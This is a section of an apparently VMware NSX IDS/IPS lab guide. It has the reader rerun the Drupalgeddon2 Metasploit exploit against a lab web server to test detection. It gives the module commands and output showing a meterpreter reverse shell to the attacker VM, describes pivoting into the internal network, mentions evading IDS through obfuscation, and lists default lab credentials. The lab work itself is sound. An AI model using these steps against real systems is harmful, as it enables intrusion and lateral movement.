## 8. Advanced Attack and Configuration
**Estimated Time to Complete: 60 minutes**

In this **optional** exercise, we will explore some more advanced options in the NSX Distributed IDS/IPS Configuration
 * Tuning IDS/IPS Profile to turn off irrelevant signatures
 * Attempt to evade IDS/IPS detection by using obfuscations
 * Enable IDS/IPS event logging directly from each host to a syslog collector/SIEM
    
    

**Open a SSH/Console session to the External VM**
1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
    * Username **vmware**
    * Password **VMware1!**
2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 

**Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
1.	Type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
    * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
    
```console
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.10.101
RHOST => 192.168.10.101
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
RPORT => 8080
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit -z

[*] Started reverse TCP handler on 10.114.209.151:4444
[*] Sending stage (38288 bytes) to 192.168.10.101
[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:50982) at 2020-07-21 20:30:34 -0500
[*] Session 1 created in the background.
msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
```
    
establish a **reverse shell** from the Drupal server, and use it as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**.
